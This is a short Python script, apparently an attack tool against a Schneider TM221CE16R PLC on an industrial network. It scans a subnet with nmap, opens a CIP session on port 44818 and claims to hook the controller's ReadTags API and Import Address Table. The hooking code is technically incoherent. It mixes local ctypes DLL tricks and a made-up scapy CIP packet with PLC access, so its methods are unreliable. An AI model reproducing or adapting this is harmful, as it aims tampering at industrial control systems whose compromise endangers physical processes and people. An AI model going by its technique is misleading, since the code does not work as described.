import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP
import ctypes

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def hook_api_function(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the API function to hook
        api_function = 'ReadTags'
        
        # Use ctypes to hook into the API function
        dll = ctypes.CDLL('pycomm.dll')
        hook = ctypes.CFUNCTYPE(None)(dll.ReadTags)
        hook.restype = None
        
        # Redirect calls to the API function
        dll.ReadTags = hook
        
        print(f"API function '{api_function}' hooked on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to hook API function: {e}")

def iat_hooking(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the IAT to hook
        iat = 'ImportAddressTable'
        
        # Use scapy to hook into the IAT
        packet = IP(dst=plc_ip)/TCP(dport=44818)/CIP(message=iat)
        send(packet, verbose=0)
        
        print(f"IAT '{iat}' hooked on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to hook IAT: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Hook into the API function
        hook_api_function(plc_ip)
        
        # Perform IAT hooking
        iat_hooking(plc_ip)
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()